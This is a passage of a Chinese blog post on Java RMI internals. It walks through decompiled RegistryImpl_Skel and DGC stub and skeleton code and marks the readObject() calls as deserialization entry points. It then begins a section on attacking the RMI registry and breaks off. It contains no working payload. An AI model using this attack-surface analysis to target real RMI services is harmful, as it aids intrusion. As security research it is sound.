+<p>之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里 skel 不为空就会调用 oldDispatch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#080808;background-color:#ffffff;">skel.dispatch</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png" srcset="/img/loading.gif" lazyload></p>
+<p>而 <font style="color:#080808;background-color:#ffffff;">skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来就到了重点：</p>
+<p><strong>RegistryImpl_Skel.class</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                String var100;<br>                Remote var103;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var100 = (String)var105.readObject();<br>                    var103 = (Remote)var105.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var100, var103);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var99 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var102.writeObject(var99);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                String var98;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    <span class="hljs-comment">//此处为注册中心，直接调用了反序列化</span><br>                    var98 = (String)var104.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var101);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                Remote var8;<br>                String var97;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var97 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var97, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                String var7;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="总结-注册中心产生的漏洞点"><a href="#总结-注册中心产生的漏洞点" class="headerlink" title="总结-注册中心产生的漏洞点"></a>总结-注册中心产生的漏洞点</h4><ol>
+<li>客户端在请求时 （<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>），<code>lookup</code>的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 <code>var98 = (String)var104.readObject();</code></li>
+</ol>
+<h3 id="3-6-服务端-客户端请求时"><a href="#3-6-服务端-客户端请求时" class="headerlink" title="3.6 服务端-客户端请求时"></a>3.6 服务端-客户端请求时</h3><p>过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。</p>
+<p>图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终拿到的 $Proxy0 是我们需要的动态代理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png" srcset="/img/loading.gif" lazyload></p>
+<p>同样来到 disp.dispatch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png" srcset="/img/loading.gif" lazyload></p>
+<p>不一样的是在 <code>skel != null</code>判断时，此时的 skel 为空，不进入 oldDispatch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续走，获取远程方法 sayHello</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后会进入 <font style="color:#080808;background-color:#ffffff;">unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终在 <code>result = method.invoke(obj, params);</code><font style="color:#080808;background-color:#ffffff;"> 这一步完成远程调用</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-7-DGC-客户端请求服务端"><a href="#3-7-DGC-客户端请求服务端" class="headerlink" title="3.7 DGC-客户端请求服务端"></a>3.7 DGC-客户端请求服务端</h3><blockquote>
+<p><font style="color:rgb(51, 51, 51);">分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。</font></p>
+<p><font style="color:rgb(51, 51, 51);">而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。</font></p>
+<p><font style="color:rgb(51, 51, 51);">而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。</font></p>
+</blockquote>
+<p><strong><font style="color:#080808;background-color:#ffffff;">DGCImpl_Stub</font></strong></p>
+<p><font style="color:rgb(80, 80, 92);">clean 就是”强”清除内存，dirty 就是”弱”清除内存</font></p>
+<p><font style="color:rgb(80, 80, 92);">这里调用了 </font><code>readObject()</code><font style="color:rgb(80, 80, 92);"> 方法，存在反序列化的入口类。</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clean</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, VMID var4, <span class="hljs-type">boolean</span> var5)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getOutputStream();<br>            var7.writeObject(var1);<br>            var7.writeLong(var2);<br>            var7.writeObject(var4);<br>            var7.writeBoolean(var5);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var6);<br>        <span class="hljs-built_in">super</span>.ref.done(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var9) &#123;<br>        <span class="hljs-keyword">throw</span> var9;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var10) &#123;<br>        <span class="hljs-keyword">throw</span> var10;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var11);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> Lease <span class="hljs-title function_">dirty</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, Lease var4)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">1</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.getOutputStream();<br>            var6.writeObject(var1);<br>            var6.writeLong(var2);<br>            var6.writeObject(var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var20) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var20);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var5);<br><br>        Lease var24;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var5.getInputStream();<br>            var24 = (Lease)var9.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var17) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var17);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var18);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var5);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var24;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var22) &#123;<br>        <span class="hljs-keyword">throw</span> var22;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var23) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var23);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(51, 51, 51);">DGCImpl_Skel</font></strong></p>
+<p><font style="color:rgb(51, 51, 51);">也存在漏洞点</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != -<span class="hljs-number">669196253586618813L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DGCImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (DGCImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                ObjID[] var39;<br>                <span class="hljs-type">long</span> var40;<br>                VMID var41;<br>                <span class="hljs-type">boolean</span> var42;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var14</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var39 = (ObjID[])var14.readObject();<br>                    var40 = var14.readLong();<br>                    var41 = (VMID)var14.readObject();<br>                    var42 = var14.readBoolean();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var36) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var36);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var37) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var37);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.clean(var39, var40, var41, var42);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var35) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var35);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                ObjID[] var7;<br>                <span class="hljs-type">long</span> var8;<br>                Lease var10;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (ObjID[])var13.readObject();<br>                    var8 = var13.readLong();<br>                    var10 = (Lease)var13.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var32);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var33) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var33);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Lease</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var6.dirty(var7, var8, var10);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var12.writeObject(var11);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var31) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var31);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="4、RMI的几种攻击方式"><a href="#4、RMI的几种攻击方式" class="headerlink" title="4、RMI的几种攻击方式"></a>4、RMI的几种攻击方式</h2><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p>
+<h3 id="4-1-攻击注册中心"><a href="#4-1-攻击注册中心" class="headerlink" title="4.1 攻击注册中心"></a>4.1 攻击注册中心</h3><p>攻击点还是在 <font style="color:#080808;background-color:#ffffff;">RegistryImpl_Skel 代码中的反序列化，</font></p>
+<p><font style="color:#080808;background-color:#ffffff;">case 的对应关系如下：</font></p>
+<ul>
+<li><font style="color:#080808;background-color:#ffffff;">case0 – bind</font></li>
+</ul>
